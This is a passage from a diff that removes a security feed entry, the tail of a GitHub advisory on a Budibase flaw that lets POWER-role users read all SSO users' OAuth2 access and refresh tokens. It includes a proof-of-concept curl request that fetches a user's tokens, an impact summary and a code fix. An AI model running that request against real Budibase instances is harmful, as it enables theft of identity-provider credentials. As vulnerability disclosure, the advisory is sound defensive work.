-  "refreshToken": "1//0eXxXxXxXx..."
-}
-</code></pre>
-<p><strong>Step 2 — Fetch a specific SSO user's profile:</strong></p>
-<pre><code class="language-bash">curl -s -X GET 'http://localhost:10000/api/users/metadata/ro_ta_users_us_&lt;sso-user-id&gt;' \
-  -H 'Cookie: budibase:auth=&lt;power-user-jwt&gt;' \
-  -H 'x-budibase-app-id: app_&lt;appid&gt;' | jq '.oauth2'
-</code></pre>
-<p>This also returns the full OAuth2 tokens.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>A user with POWER role in any app can read <strong>all SSO users' OAuth2 access tokens and refresh tokens</strong> via the list endpoint, without needing to know individual user IDs.</li>
-<li>Stolen access tokens can be used to access external identity provider resources (Google Workspace, Azure AD, Okta-protected services) as the victim user.</li>
-<li>Refresh tokens allow indefinite token renewal, persisting access even after the original access token expires.</li>
-<li>Additionally, <code>admin</code>, <code>builder</code>, <code>tenantId</code>, <code>ssoId</code>, and <code>userGroups</code> fields are leaked, revealing the full authorization topology of the instance.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Strip sensitive SSO fields in <code>processUser()</code> at <code>packages/server/src/utilities/global.ts:15</code>:</p>
-<pre><code class="language-typescript">export async function processUser(
-  user: ContextUser,
-  opts: { appId?: string; groups?: UserGroup[] } = {}
-) {
-  if (!user || (!user.roles &amp;&amp; !user.userGroups)) {
-    return user
-  }
-  user = cloneDeep(user)
-  delete user.password
-+ delete (user as any).oauth2
-+ delete (user as any).provider
-+ delete (user as any).providerType
-+ delete (user as any).thirdPartyProfile
-+ delete (user as any).profile
-+ delete (user as any).ssoId
-+ delete (user as any).forceResetPassword
-  // ... rest of function
-</code></pre>
-<p>Additionally, <code>getRawGlobalUsers()</code> at line 101 should also strip <code>oauth2</code> alongside its existing <code>password</code>/<code>forceResetPassword</code> stripping for defense in depth.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-fcrw-f7gg-6g9f">https://github.com/Budibase/budibase/security/advisories/GHSA-fcrw-f7gg-6g9f</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19110">https://github.com/Budibase/budibase/pull/19110</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/7b8ba11a2c8b233c35e7728dd752dba25ef919a4">https://github.com/Budibase/budibase/commit/7b8ba11a2c8b233c35e7728dd752dba25ef919a4</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/80a31f6c3354620aa90e50af8a2c614333084621">https://github.com/Budibase/budibase/commit/80a31f6c3354620aa90e50af8a2c614333084621</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.25">https://github.com/Budibase/budibase/releases/tag/3.39.25</a></li>
-<li><a href="https://github.com/advisories/GHSA-fcrw-f7gg-6g9f">https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-24T21:14:31.000Z</published>
     </entry>
 </feed>
